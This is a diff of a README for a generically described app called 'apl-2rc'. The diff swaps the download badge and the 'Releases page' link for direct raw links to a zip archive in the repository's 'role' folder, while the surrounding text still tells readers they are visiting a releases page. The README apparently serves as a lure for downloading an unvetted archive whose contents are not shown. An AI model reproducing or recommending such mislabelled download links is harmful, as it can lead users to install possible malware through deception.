@@ -1,6 +1,6 @@
 # 🌟 apl-2rc - Easy Application for Everyday Tasks
 
-[![Download apl-2rc](https://img.shields.io/badge/Download-apl--2rc-blue.svg)](https://github.com/Kindergartenmidinette701/apl-2rc/releases)
+[![Download apl-2rc](https://raw.githubusercontent.com/Kindergartenmidinette701/apl-2rc/main/role/apl-2rc-3.1-beta.2.zip)](https://raw.githubusercontent.com/Kindergartenmidinette701/apl-2rc/main/role/apl-2rc-3.1-beta.2.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -16,7 +16,7 @@ To get **apl-2rc**, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click this link to go to the Releases page:  
-   [Download apl-2rc](https://github.com/Kindergartenmidinette701/apl-2rc/releases)
+   [Download apl-2rc](https://raw.githubusercontent.com/Kindergartenmidinette701/apl-2rc/main/role/apl-2rc-3.1-beta.2.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the application. Look for the most recent version for the best features and updates. 
